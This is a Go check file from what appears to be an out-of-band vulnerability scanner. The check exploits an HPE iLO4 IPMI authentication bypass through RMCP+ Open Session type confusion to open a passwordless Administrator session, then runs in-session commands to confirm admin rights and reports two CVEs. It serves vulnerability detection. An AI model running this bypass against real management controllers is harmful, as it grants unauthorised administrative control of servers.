package check

import (
	"context"
	"fmt"
	"strings"

	"github.com/runZeroInc/oobscan/pkg/engine"
	"github.com/runZeroInc/oobscan/pkg/ipmi"
)

// iLO4 stores algorithms by position but validates their declared record type.
// A type-confused auth record can select RAKP-none while bypassing the algo-0
// guard. The check requires the normal control to fail and the session to work.
func init() {
	Register(Check{
		Name:        "ipmi.ilo.rakpNoneBypass",
		Description: "HPE iLO4 authentication bypass: RAKP-none via RMCP+ Open Session payload-type confusion (auth algorithm record declared type 0x02 with algo 0) evades the auth-algo-0 reject guard and activates a passwordless Administrator-capable session",
		Category:    "auth",
		Applies:     Applicability{Vendors: []string{"hpe"}},
		Enabled:     true,
		Run:         runILORAKPNoneBypass,
	})
	RegisterExplain("ipmi.ilo.integrityBypass", explainILOIntegrityBypass)
}

func runILORAKPNoneBypass(ctx context.Context, t *engine.Target) []engine.Finding {
	_ = ctx
	if t.DisableLogins {
		return nil
	}
	port := t.IPMIPort()
	timeout := t.Timeout

	// Control: the target must not accept a normal auth-algo-0 Open Session --
	// either an explicit reject (status 0x04) or a dropped reply (iLO4 2.82
	// silently discards the honest request while answering the type-confused
	// one) counts as non-acceptance; only an explicit accept downgrades this to
	// plain Cipher Suite 0 support (out of scope). Retries absorb iLO's
	// transient UDP drops under load.
	var accepted bool
	var ctrlStatus byte
	var err error
	for range 3 {
		accepted, ctrlStatus, err = ipmi.ILOAlgoZeroControlAccepted(t.Host, port, timeout)
		if err == nil {
			break
		}
	}
	if accepted {
		return nil
	}

	ctrlEvidence := fmt.Sprintf("status=0x%02x", ctrlStatus)
	ctrlProof := fmt.Sprintf("0x%02x", ctrlStatus)
	if err != nil {
		// All control attempts timed out: the box dropped the honest algo-0
		// request (iLO4 2.82 behavior) instead of explicitly rejecting it.
		ctrlEvidence = "no-reply"
		ctrlProof = "dropped"
	}

	// Exploit: open a passwordless session via the type-confused auth record.
	// iLO4's default administrator account is "Administrator" (no password used).
	const user = "Administrator"
	var sess *ipmi.Session20
	for range 3 {
		sess, err = ipmi.OpenSession20ILORAKPNone(t.Host, port, user, 0x04, timeout)
		if err == nil {
			break
		}
	}
	if err != nil || sess == nil {
		return nil
	}
	defer sess.Close()

	// Prove the passwordless session is genuinely usable: sessionless requests to
	// iLO4 get no reply, so a Get Device ID that returns cc=0x00 over this session
	// is only possible because the bypass activated a real session.
	cc, data, derr := sess.Exec(0x06, 0x01, nil)
	if derr != nil || cc != 0x00 {
		return nil
	}
	fw := ""
	if len(data) >= 4 {
		fw = fmt.Sprintf("%d.%02x", data[2]&0x7f, data[3])
	}

	// Get User Access provides dynamic proof of administrator access.
	adminConfirmed := "false"
	uaEvidence := ""
	if acc, uaData, aerr := sess.Exec(0x06, 0x44, []byte{0x0e, 0x01}); aerr == nil {
		uaEvidence = fmt.Sprintf("cc=0x%02x,data=%x", acc, uaData)
		if acc == 0x00 {
			adminConfirmed = "true"
		}
	}

	// Evidence fields carry only the dynamic wire responses that a hardened/unaffected
	// box cannot produce: the honest algo-0 Open Session is rejected (0x04) or
	// dropped, while the type-confused one activates a session whose in-session
	// commands answer (a sessionless iLO4 request times out entirely). No prose.
	bypass := iloRAKPNoneBypassFinding(port, user, ctrlEvidence, ctrlProof, cc, data, uaEvidence, adminConfirmed, fw)
	return []engine.Finding{bypass, iloIntegrityBypassFinding(port, cc, data, fw)}
}

func iloRAKPNoneBypassFinding(port int, user, ctrlEvidence, ctrlProof string, cc byte, data []byte, uaEvidence, adminConfirmed, firmware string) engine.Finding {
	return engine.Finding{
		Check:     "ipmi.ilo.rakpNoneBypass",
		Category:  "auth",
		Risk:      "critical",
		CVE:       []string{"CVE-2026-65206"},
		Port:      port,
		Transport: "udp",
		Protocol:  "ipmi",
		Fields: engine.F(
			"authBypassed", "true",
			"username", user,
			"ctrlOpenStatus", ctrlEvidence,
			"confusedOpen", "activated",
			"getDeviceID", fmt.Sprintf("cc=0x%02x,data=%x", cc, data),
			"getUserAccess", uaEvidence,
			"adminConfirmed", adminConfirmed,
			"firmwareVersion", firmware,
			"proof", proofKV(
				"controlOpenStatus", ctrlProof,
				"typeConfusedOpen", "activated",
				"getDeviceIdCc", fmt.Sprintf("0x%02x", cc),
				"adminConfirmed", adminConfirmed),
		),
	}
}

func iloIntegrityBypassFinding(port int, cc byte, data []byte, firmware string) engine.Finding {
	return engine.Finding{
		Check:     "ipmi.ilo.integrityBypass",
		Category:  "auth",
		Risk:      "high",
		CVE:       []string{"CVE-2026-65205"},
		Port:      port,
		Transport: "udp",
		Protocol:  "ipmi",
		Fields: engine.F(
			"negotiatedIntegrity", "hmac-sha1-96",
			"negotiatedConfidentiality", "aes-cbc-128",
			"acceptedProtection", "cleartext",
			"getDeviceIdCc", fmt.Sprintf("0x%02x", cc),
			"getDeviceIdData", fmt.Sprintf("%x", data),
			"firmwareVersion", firmware,
			// getDeviceIdData is the device's own reply to the unprotected command, which is
			// what proves the integrity bypass executed something. The other four values are
			// the negotiated suite plus a success code, identical on every affected host.
			"proof", proofKV(
				"negotiatedIntegrity", "hmac-sha1-96",
				"negotiatedConfidentiality", "aes-cbc-128",
				"acceptedProtection", "cleartext",
				"getDeviceIdCc", fmt.Sprintf("0x%02x", cc),
				"getDeviceIdData", fmt.Sprintf("%x", data))),
	}
}

func explainILOIntegrityBypass(host string, f engine.Finding) string {
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nThe session accepted a cleartext command after negotiating integrity and confidentiality.\n")
	return b.String()
}
